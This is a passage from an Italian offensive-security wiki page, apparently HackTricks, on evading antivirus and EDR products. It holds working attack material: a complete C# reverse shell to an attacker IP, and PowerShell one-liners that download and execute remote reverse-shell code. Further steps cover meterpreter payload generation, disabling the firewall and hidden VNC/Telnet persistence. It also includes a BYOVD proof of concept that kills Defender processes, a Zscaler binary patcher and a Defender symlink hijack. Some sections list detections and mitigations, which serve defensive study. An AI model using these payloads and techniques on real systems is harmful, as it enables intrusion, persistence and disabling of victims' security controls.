:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a come AMSI viene disattivato (bypassato), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare eventi. Questo si ottiene patchando la funzione in memoria per farla ritornare subito, disabilitando così il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti post-exploitation senza farsi rilevare dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di patchare AMSI per l'intero processo.

La maggior parte dei C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel creare un nuovo processo sacrficiale, iniettare il tuo codice post-exploitation maligno in quel nuovo processo, eseguirlo e, una volta terminato, terminare il processo. Questo ha vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **outside** our Beacon implant process. Ciò significa che se qualcosa nella nostra azione post-exploitation va storto o viene rilevata, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che hai una **probabilità maggiore** di essere catturato da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice post-exploitation maligno **nel proprio processo**. In questo modo puoi evitare di creare un nuovo processo e farlo scannerizzare dall'AV, ma lo svantaggio è che se qualcosa va storto nell'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo Beacon**, poiché potrebbe crashare.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di C# Assembly, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **from PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice maligno usando altri linguaggi dando alla macchina compromessa accesso **to the interpreter environment installed on the Attacker Controlled SMB share**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. Test con script reverse shell casuali non offuscati in questi linguaggi si sono rivelati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attacker di **manipolare l'access token o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non muoia ma non abbia i permessi per verificare attività dannose.

Per prevenire ciò, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso di software affidabile

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop su un PC vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer silenziosamente sulla vittima (richiede admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il comando fornito con alcuni aggiustamenti: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Evasione avanzata

L'evasione è un argomento molto complicato, a volte bisogna tenere conto di molte fonti di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui agisci avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per approfondire le tecniche di evasione avanzata.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Controllare quali parti Defender considera dannose**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che rimuoverà parti del binario finché non scopre quale parte Defender considera dannosa e te la suddividerà.\
Un altro tool che fa la stessa cosa è [**avred**](https://github.com/dobin/avred) con un servizio web pubblico in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fai in modo che si **avvii** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i bin downloads, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

Il **attacker** dovrebbe **eseguire all'interno** del suo **host** il binario `vncviewer.exe -listen 5900` così sarà **preparato** a catturare una reverse **VNC connection**. Poi, all'interno della **victim**: Avvia il demone winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Per mantenere la stealth non fare le seguenti cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o farà aprire [the config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il defender corrente terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e lo abusa per eseguire operazioni privilegiate in kernel che anche i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dell’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver riporta una firma Microsoft valida si carica anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come servizio **kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile da user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per uccidere i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Unload del driver e rimozione del servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD bypassa completamente le protezioni in user-mode; il codice che esegue in kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la block list dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi servizi *kernel* e generare alert quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella allow-list.  
•  Sorvegliare handle in user-mode verso oggetti device custom seguiti da sospette chiamate a `DeviceIoControl`.

### Bypass dei posture checks di Zscaler Client Connector tramite patching binario on-disk

Il **Client Connector** di Zscaler applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (viene inviato al server solo un booleano).  
2. Gli endpoint RPC interni verificano solo che l’eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari firmati su disco entrambi i meccanismi possono essere neutralizzati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Aggirati |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di postura mostrano **verde/conforme**.
* Binaries non firmati o modificati possono aprire gli endpoint RPC su named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di fiducia puramente lato client e semplici controlli di firma possano essere sconfitte con poche modifiche ai byte.

## Abuso di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia firmatario/livello in modo che solo processi protetti di pari o superiore livello possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità benign (es., logging) in una primitiva di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

Cosa fa sì che un processo venga eseguito come PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Se avviato come processo PPL, la scrittura del file avviene con il supporto PPL.
- ClipUp non può analizzare percorsi che contengono spazi; usare percorsi 8.3 short per puntare in posizioni normalmente protette.

8.3 short path helpers
- Elencare i nomi corti: `dir /x` in ogni parent directory.
- Derivare il percorso 8.3 in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avviare il LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (e.g., CreateProcessAsPPL).
2) Passare l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (e.g., Defender Platform). Usare nomi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (e.g., MsMpEng.exe), pianificare la scrittura all'avvio prima che l'AV si avvii installando un servizio ad avvio automatico che venga eseguito in modo affidabile prima. Validare l'ordine di boot con Process Monitor (boot logging).
4) Al riavvio la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre alla posizione; la primitiva è adatta alla corruzione più che all'iniezione precisa di contenuti.
- Richiede privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita i lock sui file.

Rilevazioni
- Creazione del processo `ClipUp.exe` con argomenti insoliti, in particolare se avviato da launcher non standard, intorno all'avvio del sistema.
- Nuovi servizi configurati per auto-avviare binari sospetti che si avviano sistematicamente prima di Defender/AV. Indagare sulla creazione/modifica di servizi antecedente ai fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sulle directory dei binari/Platform di Defender; creazioni/modifiche di file inattese da parte di processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo di livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali genitori; bloccare l'invocazione di ClipUp al di fuori di contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi auto-avvianti e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che Defender tamper protection e le protezioni di early-launch siano abilitate; indagare errori di avvio che indichino corruzione dei binari.
- Considerare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano tooling di sicurezza, se compatibile con il vostro ambiente (test approfonditi).

Riferimenti per PPL e tooling
- Panoramica sui Protected Processes di Microsoft: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Riferimento EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validazione dell'ordine): https://learn.microsoft.com/sysinternals/downloads/procmon
- Launcher CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Writeup della tecnica (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink sotto la cartella Platform)
- Capacità di riavviare o di forzare la riconsiderazione della Platform di Defender (riavvio del servizio all'avvio)
- Richiede solo strumenti integrati (mklink)

Perché funziona
- Defender impedisce le scritture nelle proprie cartelle, ma la sua selezione della Platform si affida alle voci di directory e sceglie la versione lexicograficamente più alta senza verificare che la destinazione risolva in un percorso protetto/attendibile.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink a una directory con versione più alta all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette quella posizione.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs che Defender carica dalla sua application directory per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink in modo che, al prossimo avvio, il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation di privilegi da sola; richiede diritti amministrativi.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams possono spostare l'evasione a runtime fuori dall'implant C2 e nel modulo target stesso agganciando la sua Import Address Table (IAT) e instradando API selezionate tramite codice controllato dall'attaccante, position‑independent (PIC). Questo generalizza l'evasione oltre la piccola superficie di API esposta da molti kit (es., CreateProcessA) e estende le stesse protezioni a BOFs e DLL post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Mascherare/smascherare la memoria attorno alla chiamata (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) poi ripristinare dopo la chiamata.
- Call‑stack spoofing: costruire uno stack benigno e transitare nell'API target in modo che l'analisi del call‑stack risolva nei frame attesi.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Funziona per qualsiasi codice che utilizzi l'import agganciato, senza modificare il codice degli strumenti o fare affidamento su Beacon per proxy di API specifiche.
- Copre le DLL post‑ex: hooking LoadLibrary* permette di intercettare i caricamenti di moduli (e.g., System.Management.Automation.dll, clr.dll) e applicare lo stesso masking/evasione dello stack alle loro chiamate API.
- Ripristina l'uso affidabile di comandi post‑ex che generano processi contro rilevamenti basati sul call‑stack avvolgendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano hooking durante DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore originale IAT che hai catturato prima della patch o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs costruiscono una catena di chiamate finta (indirizzi di ritorno in moduli benigni) e poi pivotano verso la vera API.
- Questo sconfigge rilevamenti che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Prepend the reflective loader to post‑ex DLLs in modo che il PIC e gli hook si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target in modo che Beacon e BOFs beneficino in modo trasparente dello stesso percorso di evasione senza cambiamenti al codice.

Considerazioni Detection/DFIR
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
